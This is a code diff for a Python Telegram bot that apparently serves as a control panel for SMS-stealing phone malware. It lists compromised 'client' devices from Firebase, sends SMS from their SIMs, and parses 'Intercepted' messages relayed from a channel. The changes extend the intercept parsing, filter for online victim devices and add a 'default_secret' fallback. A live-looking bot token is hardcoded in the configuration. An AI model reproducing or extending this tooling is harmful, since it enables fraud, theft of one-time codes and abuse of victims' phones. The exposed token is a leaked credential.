@@ -20,7 +20,7 @@ from telegram.ext import (
 # ---------------------------- Configuration ---------------------------------
 TOKEN = "8948519639:AAHH3PArfOskunJT0DQIwItb5jSaZ_zrnkQ"  # Replace with your bot token
 DATA_FILE = "user_data.json"
-POLL_INTERVAL = 5
+POLL_INTERVAL = 1
 AUTO_PAUSE_MINUTES = 5
 
 # Owner IDs (hardcoded)
@@ -114,17 +114,26 @@ async def notify_admins(context: ContextTypes.DEFAULT_TYPE, actor_id: int, actio
         except Exception as e:
             logger.error(f"Failed to notify admin {recipient}: {e}")
 
-# ---------------------------- Firebase Helpers (unchanged) -----------------
+# ---------------------------- Firebase Helpers -----------------------------
+_session: Optional[aiohttp.ClientSession] = None
+
+async def get_http_session() -> aiohttp.ClientSession:
+    global _session
+    if _session is None or _session.closed:
+        timeout = aiohttp.ClientTimeout(total=5)
+        _session = aiohttp.ClientSession(timeout=timeout)
+    return _session
+
 async def firebase_get(url: str, secret: str, path: str) -> Optional[dict]:
     base = url.rstrip('/')
     auth = f"?auth={secret}" if secret else ""
-    async with aiohttp.ClientSession() as session:
-        async with session.get(f"{base}/{path}.json{auth}") as resp:
-            if resp.status == 404:
-                return None
-            if resp.status != 200:
-                raise Exception(f"Firebase GET error {resp.status}")
-            return await resp.json()
+    session = await get_http_session()
+    async with session.get(f"{base}/{path}.json{auth}") as resp:
+        if resp.status == 404:
+            return None
+        if resp.status != 200:
+            raise Exception(f"Firebase GET error {resp.status}")
+        return await resp.json()
 
 async def firebase_put(url: str, secret: str, path: str, data: dict) -> dict:
     base = url.rstrip('/')
@@ -132,13 +141,13 @@ async def firebase_put(url: str, secret: str, path: str, data: dict) -> dict:
     full_url = f"{base}/{path}.json{auth}"
     logger.info(f"Firebase PUT to: {full_url}")
     logger.info(f"Payload: {json.dumps(data)}")
-    async with aiohttp.ClientSession() as session:
-        async with session.put(full_url, json=data) as resp:
-            response_text = await resp.text()
-            logger.info(f"Firebase response status: {resp.status}, body: {response_text[:200]}")
-            if resp.status not in (200, 201):
-                raise Exception(f"Firebase PUT error {resp.status}: {response_text}")
-            return await resp.json() if response_text else {}
+    session = await get_http_session()
+    async with session.put(full_url, json=data) as resp:
+        response_text = await resp.text()
+        logger.info(f"Firebase response status: {resp.status}, body: {response_text[:200]}")
+        if resp.status not in (200, 201):
+            raise Exception(f"Firebase PUT error {resp.status}: {response_text}")
+        return await resp.json() if response_text else {}
 
 async def send_sms_to_firebase(url: str, secret: str, device_id: str, to: str, message: str, from_sim: Union[int, str]) -> dict:
     sim_index = 1 if from_sim == 1 or from_sim == "1" else 2
@@ -181,7 +190,7 @@ async def send_sms_with_sim_choice(user: dict, to: str, message: str) -> tuple:
     error_msg = "; ".join(errors) if errors else None
     return success, error_msg
 
-async def get_devices(url: str, secret: str) -> list:
+async def get_devices(url: str, secret: str = "") -> list:
     data = await firebase_get(url, secret, "clients")
     if not data:
         return []
@@ -189,12 +198,15 @@ async def get_devices(url: str, secret: str) -> list:
     for dev_id, info in data.items():
         if not isinstance(info, dict):
             continue
+        status = bool(info.get("status"))
+        # Only include ONLINE devices
+        if not status:
+            continue
         sims = info.get("sims", [])
         if isinstance(sims, dict):
             sims = list(sims.values())
         name = info.get("modelName") or info.get("model") or dev_id
         phone = info.get("mobNo") or (sims[0].get("phoneNumber") if sims else "—")
-        status = bool(info.get("status"))
         devices.append({
             "id": dev_id,
             "name": name,
@@ -304,23 +316,14 @@ async def text_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_firebase_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if context.user_data.get("expecting_firebase_url"):
         url = update.message.text.strip()
-        context.user_data["firebase_url_temp"] = url
-        context.user_data["expecting_firebase_url"] = False
-        context.user_data["expecting_firebase_secret"] = True
-        await update.message.reply_text(
-            "Now send your *Database Secret key*.\n"
-            "Find it in Firebase Console → Project Settings → Service Accounts → Database Secrets.",
-            parse_mode="Markdown"
-        )
-    elif context.user_data.get("expecting_firebase_secret"):
-        secret = update.message.text.strip()
-        url = context.user_data.pop("firebase_url_temp", "")
-        context.user_data.pop("expecting_firebase_secret", False)
-        if not url:
-            await update.message.reply_text("❌ Something went wrong. Use /setfirebase again.")
+        context.user_data.pop("expecting_firebase_url", None)
+        context.user_data.pop("expecting_firebase_secret", None)
+        if not url.startswith("http"):
+            await update.message.reply_text("❌ URL must start with http:// or https://")
             return
         user_id = update.effective_user.id
         user = get_user(user_id)
+        secret = user.get("secret") or "default_secret"
         try:
             await firebase_get(url, secret, "clients")
         except Exception as e:
@@ -330,12 +333,10 @@ async def handle_firebase_input(update: Update, context: ContextTypes.DEFAULT_TY
         user["secret"] = secret
         save_user(str(user_id), user)
         devices = await get_devices(url, secret)
-        online = sum(1 for d in devices if d["status"])
         await update.message.reply_text(
-            f"✅ Firebase URL set!\n{url}\n\n📊 {len(devices)} client(s) found, {online} online\n\nNext: /setdevice",
+            f"✅ Firebase URL set!\n{url}\n\n📊 {len(devices)} online client(s) found\n\nNext: /setdevice",
             reply_markup=get_main_keyboard()
         )
-        # Audit notification
         await notify_admins(context, user_id, "Firebase configured", f"URL: {url}")
 
 # ---------------------------- Manual Device ID ------------------------------
@@ -460,37 +461,39 @@ async def handle_channel_input(update: Update, context: ContextTypes.DEFAULT_TYP
 def parse_sms_from_channel(text: str) -> tuple:
     to_number = None
     message = None
-    clean_text = text.replace('`', '')
-    lines = [line.strip() for line in clean_text.split('\n') if line.strip()]
+    clean_text = text.replace('`', '').strip()
 
+    # Handle New Format: "To (Tap to copy):" and "Body (Tap to copy):"
+    if 'To (Tap to copy)' in clean_text or 'Body (Tap to copy)' in clean_text or 'Intercepted' in clean_text:
+        to_match = re.search(r'To\s*\([^)]*\):\s*([^\n]+)', clean_text, re.IGNORECASE)
+        if not to_match:
+            to_match = re.search(r'To\s*\([^)]*\):\s*\n+([^\n]+)', clean_text, re.IGNORECASE)
+        if to_match:
+            to_number = to_match.group(1).strip()
+
+        body_match = re.search(r'Body\s*\([^)]*\):\s*([\s\S]+)', clean_text, re.IGNORECASE)
+        if body_match:
+            message = body_match.group(1).strip()
+
+    if to_number and message:
+        return to_number, message
+
+    # Handle Old Format & generic patterns
+    lines = [line.strip() for line in clean_text.split('\n') if line.strip()]
     for i, line in enumerate(lines):
-        # New format pattern: "To (Tap to copy):"
-        if re.search(r'To\s*\([^)]*\):?', line, re.IGNORECASE):
-            parts = re.split(r'To\s*\([^)]*\):?', line, flags=re.IGNORECASE, maxsplit=1)
-            if len(parts) > 1 and parts[1].strip():
+        if not to_number and re.match(r'^(?:📞\s*)?To\s*:', line, re.IGNORECASE):
+            parts = re.split(r'^.+?:\s*', line, maxsplit=1)
+            if len(parts) == 2 and parts[1].strip():
                 to_number = parts[1].strip()
             elif i + 1 < len(lines):
                 to_number = lines[i + 1].strip()
 
-        # New format pattern: "Body (Tap to copy):"
-        elif re.search(r'Body\s*\([^)]*\):?', line, re.IGNORECASE):
-            parts = re.split(r'Body\s*\([^)]*\):?', line, flags=re.IGNORECASE, maxsplit=1)
-            if len(parts) > 1 and parts[1].strip():
+        elif not message and re.match(r'^(?:💬\s*)?(?:Message|Body)\s*:', line, re.IGNORECASE):
+            parts = re.split(r'^.+?:\s*', line, maxsplit=1)
+            if len(parts) == 2 and parts[1].strip():
                 message = parts[1].strip()
             elif i + 1 < len(lines):
-                message = lines[i + 1].strip()
-
-        # Old format patterns: "📞 To: ..." or "To: ..."
-        elif re.match(r'^(?:📞\s*)?To\s*:', line, re.IGNORECASE):
-            parts = re.split(r'^.+?:\s*', line, maxsplit=1)
-            if len(parts) == 2 and parts[1].strip():
-                to_number = parts[1].strip()
-
-        # Old format patterns: "💬 Message: ..." or "Message: ..."
-        elif re.match(r'^(?:💬\s*)?Message\s*:', line, re.IGNORECASE):
-            parts = re.split(r'^.+?:\s*', line, maxsplit=1)
-            if len(parts) == 2 and parts[1].strip():
-                message = parts[1].strip()
+                message = '\n'.join(lines[i + 1:])
 
     if not to_number or not message:
         for line in lines:
@@ -711,29 +714,27 @@ async def edit_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def setfirebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
-    if args and len(args) >= 2:
-        url = args[0]
-        secret = args[1]
+    if args:
+        url = args[0].strip()
         if not url.startswith("http"):
             await update.message.reply_text("❌ URL must start with http:// or https://")
             return
+        user_id = update.effective_user.id
+        user = get_user(user_id)
+        secret = user.get("secret") or "default_secret"
         try:
             await firebase_get(url, secret, "clients")
         except Exception as e:
             await update.message.reply_text(f"❌ Firebase test failed: {str(e)}")
             return
-        user_id = update.effective_user.id
-        user = get_user(user_id)
         user["firebase_url"] = url
         user["secret"] = secret
         save_user(str(user_id), user)
         devices = await get_devices(url, secret)
-        online = sum(1 for d in devices if d["status"])
         await update.message.reply_text(
-            f"✅ Firebase URL set!\n{url}\n\n📊 {len(devices)} client(s) found, {online} online\n\nNext: /setdevice",
+            f"✅ Firebase URL set!\n{url}\n\n📊 {len(devices)} online client(s) found\n\nNext: /setdevice",
             reply_markup=get_main_keyboard()
         )
-        # Audit notification
         await notify_admins(context, user_id, "Firebase configured", f"URL: {url}")
     else:
         context.user_data["expecting_firebase_url"] = True
@@ -748,25 +749,24 @@ async def setfirebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def setdevice(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user = get_user(user_id)
-    if not user["firebase_url"] or not user["secret"]:
+    if not user["firebase_url"]:
         await update.message.reply_text("❌ Firebase not set. Use /setfirebase first.")
         return
-    devices = await get_devices(user["firebase_url"], user["secret"])
+    devices = await get_devices(user["firebase_url"], user.get("secret", ""))
     if not devices:
-        await update.message.reply_text("❌ No devices found in Firebase.")
+        await update.message.reply_text("❌ No online devices found in Firebase.")
         return
     keyboard = []
     for dev in devices:
-        status_icon = "🟢" if dev["status"] else "⚫"
-        label = f"{status_icon} {dev['name']} ({dev['phone']})"
+        label = f"🟢 {dev['name']} ({dev['phone']})"
         keyboard.append([InlineKeyboardButton(label, callback_data=f"dev_{dev['id']}")])
     keyboard.append([InlineKeyboardButton("✏️ Enter Device ID manually", callback_data="dev_manual")])
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
-        f"{len(devices)} device(s) found.\n"
-        f"Currently selected: {user['device_id'] or 'none selected'}\n\n"
-        "Tap a device to select it.\n"
-        "If your device isn't listed, tap 'Enter Device ID manually'.",
+        f"🟢 {len(devices)} online device(s) found.\n"
+        f"Currently selected: `{user['device_id'] or 'none selected'}`\n\n"
+        "Tap an online device to select it:",
+        parse_mode="Markdown",
         reply_markup=reply_markup
     )
     context.user_data["temp_devices"] = devices
